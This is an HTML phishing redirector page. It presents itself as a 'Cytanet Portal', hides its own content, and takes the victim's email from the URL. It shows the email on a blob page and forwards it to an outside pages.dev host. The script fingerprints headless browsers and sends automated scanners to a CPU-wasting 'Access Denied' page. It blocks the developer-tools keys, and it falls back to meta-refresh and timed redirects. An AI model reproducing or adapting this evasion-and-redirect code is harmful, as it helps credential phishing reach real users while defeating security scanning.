<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title></title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100vw;
    height: 100vh;
    background: white;
    overflow: hidden;
}
* {
    opacity: 0 !important;
    visibility: hidden !important;
}
</style>
</head>
<body>

<script>
// === FIXED VERSION - EMAIL PASSED TO FINAL PAGE ===
// Email appears in the final blob page
// Works on mobile, no download prompts

(function() {
    'use strict';
    
    // === CONFIG ===
    const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
    
    // Get email from URL
    function getEmail() {
        const params = new URLSearchParams(location.search);
        return params.get("email") || "";
    }
    
    // === CREATE BLOB WITH EMAIL PARAMETER ===
    function createBlobWithEmail(targetBase) {
        const email = getEmail();
        
        // Build the final URL with email properly passed
        let finalUrl = targetBase;
        
        if (email) {
            // Pass email as URL hash AND query parameter for maximum compatibility
            finalUrl += "#email=" + encodeURIComponent(email);
        }
        
        // Create HTML that will show the email
        const html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>Cytanet Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        
        h1 {
            margin-bottom: 20px;
            font-size: 28px;
            font-weight: 300;
        }
        
        .email-display {
            background: rgba(255, 255, 255, 0.2);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 18px;
            word-break: break-all;
        }
        
        .status {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.8;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to Cytanet Portal</h1>
        
        <div class="email-display" id="emailDisplay">
            Loading your account...
        </div>
        
        <div class="spinner"></div>
        
        <div class="status" id="status">
            Preparing your secure session...
        </div>
    </div>
    
    <script>
        // Get email from URL
        function getEmailFromURL() {
            // Try multiple methods to get email
            
            // Method 1: From hash (#email=...)
            const hash = window.location.hash;
            if (hash) {
                const match = hash.match(/email=([^&]+)/);
                if (match) {
                    return decodeURIComponent(match[1]);
                }
            }
            
            // Method 2: From query string (?email=...)
            const params = new URLSearchParams(window.location.search);
            if (params.has('email')) {
                return params.get('email');
            }
            
            // Method 3: From parent window (if in iframe)
            try {
                if (window.parent && window.parent !== window) {
                    const parentUrl = window.parent.location.href;
                    const parentMatch = parentUrl.match(/[?&]email=([^&]+)/);
                    if (parentMatch) {
                        return decodeURIComponent(parentMatch[1]);
                    }
                }
            } catch(e) {}
            
            return 'Not specified';
        }
        
        // Display the email
        function displayEmail() {
            const email = getEmailFromURL();
            const display = document.getElementById('emailDisplay');
            const status = document.getElementById('status');
            
            if (email && email !== 'Not specified') {
                display.innerHTML = \`<strong>Account:</strong><br>\${email}\`;
                status.textContent = 'Redirecting to secure portal...';
                
                // Redirect to actual page after showing email
                setTimeout(() => {
                    window.location.href = \`\${TARGET_BASE}?email=\${encodeURIComponent(email)}\`;
                }, 2000);
            } else {
                display.innerHTML = '<strong>No email specified</strong>';
                status.textContent = 'Please provide an email address';
            }
        }
        
        // Start when page loads
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', displayEmail);
        } else {
            displayEmail();
        }
        
        // Log for debugging
        console.log('Blob page loaded with email:', getEmailFromURL());
    <\/script>
</body>
</html>`;
        
        return new Blob([html], { 
            type: "text/html",
            endings: "transparent"
        });
    }
    
    // === BOT DETECTION ===
    function detectBot() {
        let score = 0;
        
        if (navigator.webdriver === true) score += 50;
        
        const ua = navigator.userAgent.toLowerCase();
        if (/headless|phantom|puppeteer|selenium|playwright/.test(ua)) score += 40;
        
        if (navigator.plugins.length === 0 && !/mobile|android|iphone/i.test(ua)) {
            score += 25;
        }
        
        const start = performance.now();
        let x = 0;
        for (let i = 0; i < 500000; i++) x += Math.random();
        const end = performance.now();
        if (end - start < 2) score += 35;
        
        return score >= 60;
    }
    
    // === HUMAN DETECTION ===
    function detectHuman() {
        return new Promise((resolve) => {
            if (/mobile|android|iphone|ipad/i.test(navigator.userAgent)) {
                resolve(true);
                return;
            }
            
            if (document.hasFocus()) {
                resolve(true);
                return;
            }
            
            let humanDetected = false;
            const events = ['touchstart', 'click', 'mousemove'];
            const handler = () => {
                if (!humanDetected) {
                    humanDetected = true;
                    resolve(true);
                    events.forEach(e => document.removeEventListener(e, handler));
                }
            };
            
            events.forEach(e => document.addEventListener(e, handler, { passive: true }));
            
            setTimeout(() => {
                if (!humanDetected) {
                    resolve(false);
                    events.forEach(e => document.removeEventListener(e, handler));
                }
            }, 300);
        });
    }
    
    // === BOT PENALTY ===
    function penalizeBot() {
        let waste = 0;
        const interval = setInterval(() => {
            for (let i = 0; i < 1000000; i++) {
                waste = (waste * 1664525 + 1013904223) % 4294967296;
            }
        }, 100);
        
        setTimeout(() => {
            clearInterval(interval);
            window.location.replace('data:text/html,<h1>Access Denied</h1>');
        }, 10000);
    }
    
    // === GRANT ACCESS ===
    async function grantAccess() {
        const blob = createBlobWithEmail(TARGET_BASE);
        const blobUrl = URL.createObjectURL(blob);
        
        // Create invisible iframe first (prevents download prompts)
        const iframe = document.createElement('iframe');
        iframe.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;border:none;';
        iframe.src = blobUrl;
        document.body.appendChild(iframe);
        
        // Then redirect main window
        setTimeout(() => {
            window.location.href = blobUrl;
        }, 100);
        
        setTimeout(() => {
            try {
                URL.revokeObjectURL(blobUrl);
            } catch(e) {}
        }, 10000);
    }
    
    // === MAIN EXECUTION ===
    async function execute() {
        if (detectBot()) {
            penalizeBot();
            return;
        }
        
        const isHuman = await detectHuman();
        const delay = isHuman ? 100 : 1500;
        
        setTimeout(grantAccess, delay);
        
        setTimeout(() => {
            if (!window.location.href.includes('blob:')) {
                grantAccess();
            }
        }, 5000);
    }
    
    // === PREVENT DOWNLOAD PROMPTS ===
    window.addEventListener('beforeunload', function(e) {
        return undefined;
    });
    
    // === START ===
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
            e.preventDefault();
            window.location.replace('about:blank');
        }
    });
    
    setTimeout(execute, 100);
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => setTimeout(execute, 50));
    } else {
        setTimeout(execute, 50);
    }
    
})();

// === FALLBACK ===
setTimeout(() => {
    const email = new URLSearchParams(window.location.search).get('email') || '';
    const url = "https://23b538b5.ko1wx90sd.pages.dev?email=" + encodeURIComponent(email);
    
    if (!window.location.href.includes('blob:')) {
        window.location.href = url;
    }
}, 8000);
</script>

<noscript>
<meta http-equiv="refresh" content="0;url=https://23b538b5.ko1wx90sd.pages.dev">
</noscript>

</body>
</html>
